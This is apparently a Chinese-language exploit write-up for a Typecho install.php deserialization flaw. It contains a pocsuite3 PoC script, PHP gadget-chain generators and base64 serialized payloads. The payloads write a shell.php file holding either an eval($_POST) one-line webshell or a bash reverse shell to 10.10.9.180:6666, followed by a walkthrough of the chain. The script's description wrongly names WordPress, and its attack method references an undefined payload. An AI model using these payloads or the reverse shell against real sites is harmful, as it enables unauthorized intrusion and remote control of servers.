```python
#!coding=utf-8

from collections import OrderedDict

from pocsuite3.api import OptString

from urllib.parse import urljoin
import base64
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD

import re
headers =  {"Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.8 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
            "Referer": "http://192.168.21.14/typecho/install.php?finish=1",
            "Content-Type": "application/x-www-form-urlencoded"
            }
payload2 = {
    '__typecho_config': '%s' % (
        "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9")
}
#这是一个上传一句话木马的payload
cookies = {"PHPSESSID": "p4rmjr1dtm1ooph2gan5pgsma3"}
class TypechoPoc(POCBase):
    vulID = '2021'              # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'               # 默认为1
    author = 'marmot'        # PoC作者的大名
    vulDate = '2021-08-12'      # 漏洞公开的时间,不知道就写今天
    createDate = '2021-08-12'   # 编写 PoC 的日期
    updateDate = '2021-08-12'   # PoC 更新的时间,默认和编写时间一样
    references = []             # 漏洞地址来源,0day不用写
    name = 'typecho安装getshell'             # 漏洞厂商主页地址
    appName = 'typecho'       # 漏洞应用名称
    appVersion = 'All'          # 漏洞影响版本
    vulType = '文件上传'          # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        WordPress后台，在上传主题模板时，可以直接getshell！
    '''                         # 漏洞简要描述
    samples = ['https://wordpress.org/']        # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']     # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''pocsuite -r _2021_typecho_all_admin_getshell.py -u http://ip/wordpress/ --username admin --password admin --verify'''

    def _verify(self,):
        result = {}
        # 验证代码
        url = self.write_shell(payload2)    
        #使用写shell的函数传入马  返回值为上传后的路径
        if url:  # result是返回结果
            r = requests.get(url = url, headers = headers)
			#对返回后的路径进行访问，返回码为200则存在漏洞
            if r.status_code == 200:
                result = {
                    'Result': {
                        'ShellInfo': {'URL': url, 'Content': 'Hacker By marmot !' },
                        'Stdout': '检测存在漏洞!'
                    }
                }

        return self.parse_output(result)


    def _attack(self):

        result = {}
        # 攻击代码

        url = self.write_shell(payload)
		#其实这里和验证是一样的
        response = requests.get(url)
        if response.status_code==200:
            result = {
                'Result': {
                    'ShellInfo': {'URL': url, 'Content': 'PHP一句话木马,密码:l'},
                    'Stdout': '上传webshell成功!'
                }
            }
        return self.parse_output(result)

    def _shell(self):
        result = {}
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
		
        finally_payload = {"__typecho_config": '''YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OTU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBzeXN0ZW0oXCdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjkuMTgwLzY2NjYgMD4mMVwnKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9'''}
        #这个payload是上传反弹shell脚本的payload
        url = self.write_shell(finally_payload)
		#还是使用写文件的函数进行写shell

        if url:
            try:
                r = requests.get(url = url, headers = headers, timeout = 5)
                #请求反弹shell的脚本
                result = {}
            except requests.exceptions.ReadTimeout as e:
                logger.warning('requests.exceptions.ReadTimeout')
                result = {
                    'Result': {
                        'Stdout': '反弹webshell成功!'
                        }
                    }
        # 攻击代码 execute cmd

        return self.parse_output(result)


    def write_shell(self,payload):
		#写shell的函数，接收写什么文件的payload

        referer = f"{self.url}/install.php?finish=1"
		#referer字段必要的添加到请求头中
        header = headers
        header['Referer'] = referer


        result = requests.post(url=self.url+"/install.php?finish=1",data=payload,headers=header,cookies=cookies)
		#通过Post请求进行payload传递参数
        url = self.url+"/shell.php"
        print(url)
        response = requests.get(url,headers=header)
        #对url进行验证，返回码为200则写成功 写的文件名为shell.php
        print(response.status_code)
        if response.status_code == 200:
            return url
        else:
            return False
    def parse_output(self, result):

        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output



# 注册 DemoPOC 类
register_poc(TypechoPoc)

```



```php
#构建反弹shell和传🐎的脚本

<?php

class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_items = array();
    public function addItem(array $item){
        $this->_items[] = $item;
    }
}
class Typecho_Request{
    private $_params = array('screenName'=> "file_put_contents('shell.php','<?php system(\\'bash -i >& /dev/tcp/10.10.9.180/6666 0>&1\\');?>')");
    private $_filter = array('assert');
}
$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1->addItem(array('author' => $payload2));
$exp = array('adapter' => $payload1, 'prefix' => 'typecho');
var_dump($exp);
echo "\n";
echo $exp;
echo serialize($exp);
echo "\n";
echo base64_encode(serialize($exp));

?>



```

![image-20210813001350226](typecho/image-20210813001350226.png)

## 

 

 

 ```php
 #写一句话木马的构建shell的php脚本
 
 <?php
 
 class Typecho_Feed{
 
   private $_type = 'ATOM 1.0';
 
   private $_items = array();
 
   public function addItem(array $item){
 
 ​    $this->_items[] = $item;
 
   }
 
 }
 
 class Typecho_Request{
 
   private $_params = array('screenName'=> 'file_put_contents(\'shell.php\', \'<?php @eval($_POST[l]);?>\')');
 
   private $_filter = array('assert');
 
 }
 
 $payload1 = new Typecho_Feed();
 
 $payload2 = new Typecho_Request();
 
 $payload1->addItem(array('author' => $payload2));
 
 $exp = array('adapter' => $payload1, 'prefix' => 'typecho');
 
 echo base64_encode(serialize($exp));
 
 ?>
 
 构建payload
 ```



![img](typecho/clip_image002.jpg)

生成base64编码

YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9

 

请求头中添加Referer字段

Referer: http://192.168.148.129/typecho/install.php?finish=1

![img](typecho/clip_image004.jpg)

访问写入的shell.php

![img](typecho/clip_image006.jpg)

 

![img](typecho/clip_image008.jpg)

 

蚁剑连接

![img](typecho/clip_image010.jpg)

服务器接受COOKIE或者POST传递的__typecho_config参数

进行base64解码 及反序列化 -》$config

 

对参数$config['adapter'],$config['prefix'] 创建Typecho_Db对象

 

创建对象的时候，使用了字符串拼接$config['adapter'],调用了__toString方法

 

 

调用to_String方法中时候调用了$item['author']->screenName的__get方法

 

__get方法返回的是对象的get($screenName（属性）)方法

 

get方法中又调用的_applyFilter($screenName);方法

 

此方法中对所有filter数组中的函数 对接收的value进行函数的执行

 

最后的结果为 assert("file_put_contents('shell.php', '<?php @eval($_POST[l]);?>')")